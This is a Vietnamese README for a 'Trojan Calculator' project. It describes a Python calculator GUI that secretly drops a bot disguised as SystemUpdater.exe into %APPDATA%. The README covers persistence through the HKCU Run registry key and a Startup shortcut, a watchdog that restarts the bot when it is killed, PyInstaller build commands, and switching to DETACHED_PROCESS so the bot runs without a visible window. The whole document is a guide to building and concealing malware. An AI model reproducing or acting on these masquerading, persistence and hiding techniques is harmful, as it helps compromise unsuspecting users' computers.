# Trojan Calculator - Phiên Bản 1 (V1)

## Tổng Quan

Phiên bản đầu tiên của dự án Trojan Calculator là một trojan cơ bản, hiển thị cửa sổ console để theo dõi hoạt động của bot. Trojan ngụy trang dưới dạng máy tính cầm tay (GUI Tkinter) và chưa có icon tùy chỉnh. Bot được sao chép vào `%APPDATA%\Roaming` với tên `SystemUpdater.exe` và chạy ngầm, hiển thị trên Task Manager dưới cùng tên.

## Tính Năng

- **Giao Diện Máy Tính Cầm Tay**: Giao diện tính toán cơ bản (cộng, trừ, nhân, chia).
- **Bot Ngầm**:
  - Sao chép `SystemUpdater.exe` vào `%APPDATA%\Roaming`.
  - Chạy ngầm với cửa sổ console hiển thị.
  - Hiển thị trong Task Manager dưới tên `SystemUpdater.exe`.
- **Cơ Chế Duy Trì**: Thêm mục `SystemUpdater` vào Registry tại `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.
- **Ghi Nhật Ký**:
  - `%APPDATA%\trojan.log`: Ghi hoạt động của trojan.
  - `%APPDATA%\system_log.txt`: Ghi trạng thái bot, cập nhật mỗi 30 giây.

## Cấu Trúc

- `calculator_trojan_V1.py`: Script chính khởi chạy giao diện và triển khai bot.
- `bot_test_V1.py`: Script bot hiển thị log trên console.

## Cách Xây Dựng và Chạy

### Đóng Gói `bot_test_V1.py`

```bash
pyinstaller --onefile --hidden-import=psutil bot_test_V1.py
copy C:\TrojanFiles\dist\bot_test_V1.exe SystemUpdater.exe
move SystemUpdater.exe C:\TrojanFiles\
```
## Chạy

- Chạy `calculator_trojan_V1.exe` để mở giao diện tính toán.
- Cửa sổ console của bot sẽ hiển thị log hoạt động.

## Điều Chỉnh `drop_bot()`

Trong `calculator_trojan_V1.py`, thay `subprocess.CREATE_NEW_CONSOLE` bằng `subprocess.DETACHED_PROCESS` trong hàm `drop_bot()`:

- `subprocess.CREATE_NEW_CONSOLE`: Tạo cửa sổ console mới, tiến trình con độc lập với console cha.
- `subprocess.DETACHED_PROCESS`: Chạy ngầm, không hiển thị terminal.
- `subprocess.CREATE_NO_WINDOW`: Phụ thuộc vào console của tiến trình cha.

### Mục đích:
Bot không mở terminal khi khởi động lần đầu, chỉ hiển thị khi dùng `CREATE_NEW_CONSOLE` để debug.

## Debug

- Sử dụng `subprocess.CREATE_NEW_CONSOLE` trong `calculator_trojan_V1.py` để `drop_bot()` mở cửa sổ mới tách biệt.
- Sử dụng `subprocess.CREATE_NEW_CONSOLE` trong `bot_test_V1.py` để watchdog khởi động lại mở console khi debug.
- Không thêm `--noconsole` khi đóng gói `bot_test_V1.py` để giữ console.

## Kiểm Tra và Debug

- **Registry**: Mở `regedit`, tìm `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdater`.
- Nếu Registry thất bại, kiểm tra `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdater.lnk`.

- **Xóa File**: Thử xóa `%APPDATA%\SystemUpdater.exe`, sẽ nhận thông báo "File in use".
- **Kill Bot**: Kill `SystemUpdater.exe` trong Task Manager, watchdog sẽ khởi động lại sau ~10 giây.

## Hạn Chế

- Hiển thị console, chưa ẩn hoạt động.
- Chưa có cơ chế watchdog tách biệt.
- Chưa có icon tùy chỉnh.

## Lưu Ý Khi Build Lại

- Clone repository về, chỉ giữ lại các file `.py` và file hình ảnh `.ico`.
- Xóa các file `.exe` và thư mục `dist` trước khi đóng gói lại.
